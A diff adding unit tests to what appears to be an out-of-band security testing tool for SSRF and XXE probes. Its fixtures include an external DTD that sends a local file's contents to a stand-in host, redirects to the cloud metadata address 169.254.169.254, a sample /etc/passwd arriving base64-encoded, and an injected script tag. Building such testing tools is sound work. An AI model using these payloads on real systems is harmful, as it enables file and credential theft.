@@ -145,6 +145,8 @@ test("kit: a hit names the payload that fired", () => {
   assert.equal(variantOf({ extraLabels: ["726f6f74"], summary: "GET /fetch/k/zz9 HTTP/1.1" }), null);
   assert.equal(encode("http://a/?b=c&d", "once"), "http%3A%2F%2Fa%2F%3Fb%3Dc%26d");
   assert.equal(encode("a b", "twice"), "a%2520b");
+  assert.equal(encode('http://a/?q="x"&y', "json"), 'http://a/?q=\\"x\\"&y');
+  assert.equal(encode('http://a/?q="x"&y<', "xml"), "http://a/?q=&quot;x&quot;&amp;y&lt;");
 });
 
 import { METADATA, redirectable, hostOf, pathOf } from "../src/lib/metadata.ts";
@@ -417,4 +419,39 @@ test("answer draft: a save keeps what the form can't show (decoy methods, a host
   // empty header rows are no headers, and a draft that only added an empty row isn't a change
   assert.equal(effective({ ...norm(file), headers: [["", ""]] }).headers, undefined);
   assert.equal(JSON.stringify(effective(norm(file))), JSON.stringify(effective({ ...norm(file), headers: [...file.headers, ["", " "]] })));
+});
+
+test("xxe: the hit detail's line says what arrived, not a cut of it", async () => {
+  const { xxeValue, xxeArrived } = await import("../src/lib/stage.ts");
+  const passwd = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n";
+  const v = xxeValue({ fullId: "kx0.x1.abc", summary: `GET /d?d=${Buffer.from(passwd).toString("base64")} HTTP/1.1` })!;
+  assert.equal(v.text, passwd, "the whole file, real newlines");
+  assert.equal(xxeArrived(v), `file data arrived: ${passwd.length} bytes, 2 lines, base64-decoded`);
+  assert.equal(xxeArrived({ text: "", base64: false }), "file data arrived: empty (the DTD ran; the read returned nothing)");
+  assert.equal(xxeArrived({ text: "host1", base64: false }), "file data arrived: 5 bytes");
+});
+
+test("answer draft: history says what changed between versions; scripts get a script tag", async () => {
+  const { ruleChanges } = await import("../src/lib/ruleDraft.ts");
+  const base = { mode: "redirect", delayMs: 0, schemes: { http: true, https: true }, status: 302, location: "http://169.254.169.254/", loop: 0 } as const;
+  assert.deepEqual(ruleChanges(base, { ...base, location: "http://127.0.0.1/", delayMs: 500 }), ["delay", "location"]);
+  assert.deepEqual(ruleChanges(base, base), []);
+  assert.deepEqual(ruleChanges(base, { mode: "default", delayMs: 0, schemes: { http: true, https: true } }), ["kind of answer"]);
+  const { hostedFile } = await import("../src/lib/plant.ts");
+  assert.deepEqual(hostedFile({ contentType: "application/javascript", body: "1" }, "bx", "h.example").plant, ['<script src="https://bx-h.example/x.js"></script>', "script tag"]);
+});
+
+test("clone: the next free tag, and the answer pointed at the new probe", async () => {
+  const { cloneTag, retarget } = await import("../src/lib/ruleDraft.ts");
+  const taken = new Set(["avatar", "avatar-2"]);
+  assert.equal(cloneTag("avatar", (t) => taken.has(t)), "avatar-3");
+  assert.equal(cloneTag("import-9", () => false), "import-10");
+  const long = "a".repeat(32);
+  const t = cloneTag(long, () => false);
+  assert.ok(t.length <= 32 && t.endsWith("-2"), t);
+  const r = retarget({ mode: "file", delayMs: 0, schemes: { http: true, https: true }, contentType: "application/xml-dtd", body: "SYSTEM 'http://av-h.example/x?d=%file;'", headers: [["Link", "<https://av-h.example/>"]] }, "av-h.example", "av-2-h.example");
+  assert.equal(r.body, "SYSTEM 'http://av-2-h.example/x?d=%file;'");
+  assert.deepEqual(r.headers, [["Link", "<https://av-2-h.example/>"]]);
+  const x = retarget({ mode: "preset", delayMs: 0, schemes: { http: true, https: true }, kind: "xxe", params: { host: "av-h.example", file: "/etc/hostname" } }, "av-h.example", "av-2-h.example");
+  assert.equal(x.params!.host, "av-2-h.example");
 });
